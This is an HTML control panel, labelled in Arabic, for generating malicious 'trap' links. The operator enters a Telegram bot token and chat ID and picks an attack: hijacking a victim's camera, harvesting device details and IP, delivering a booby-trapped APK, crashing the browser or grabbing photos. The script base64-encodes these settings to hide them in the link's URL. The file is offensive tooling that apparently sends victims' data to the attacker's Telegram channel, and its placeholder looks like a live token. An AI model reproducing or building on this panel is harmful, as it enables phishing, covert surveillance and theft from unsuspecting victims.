<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Worm-Control Void Admin</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; }
        .panel { border: 2px solid #00ff00; padding: 30px; margin: 50px auto; width: 60%; border-radius: 15px; box-shadow: 0 0 20px #00ff00; }
        select, input, button { padding: 12px; background: #222; color: #00ff00; border: 1px solid #00ff00; margin: 10px; font-size: 16px; cursor: pointer; }
        button:hover { background: #00ff00; color: #000; font-weight: bold; }
        .result { margin-top: 20px; padding: 15px; background: #111; border: 1px dashed #00ff00; color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>☠️ Worm-Control Panel ☠️</h1>
    <div class="panel">
        <h3>مولد الروابط التدميرية</h3>
        <input type="text" id="botToken" placeholder="8823265342:AAETGh1aeT1b7O_qsyoCmKQ4qTgY-RB0ijM">
        <input type="text" id="chatId" placeholder="8278259831">
        <br>
        <select id="attackType">
            <option value="camera">📹 فتح الكاميرا (سحب وصول)</option>
            <option value="info">ℹ️ سحب معلومات الجهاز والـ IP</option>
            <option value="apk">📦 تحميل ملف APK ملغوم</option>
            <option value="crash">💥 تجميد وتحطيم المتصفح</option>
            <option value="photos">📸 طلب الوصول للصور</option>
        </select>
        <br>
        <button onclick="generateLink()">توليد الرابط القاتل</button>
        <div id="finalLink" class="result">الرابط سيظهر هنا...</div>
    </div>

    <script>
        function generateLink() {
            const token = document.getElementById('botToken').value;
            const chat = document.getElementById('chatId').value;
            const type = document.getElementById('attackType').value;
            if(!token || !chat) { alert("يا سيدي، أدخل بيانات البوت أولاً!"); return; }
            
            // تحويل البيانات إلى Base64 لتمويهها في الرابط
            const data = btoa(JSON.stringify({token: token, chat: chat, type: type}));
            const baseUrl = window.location.href.replace('index.html', 'trap.html');
            const finalUrl = `${baseUrl}?id=${data}`;
            
            document.getElementById('finalLink').innerHTML = `الرابط الجاهز: <br><a href="${finalUrl}" style="color:white">${finalUrl}</a>`;
        }
    </script>
</body>
</html>
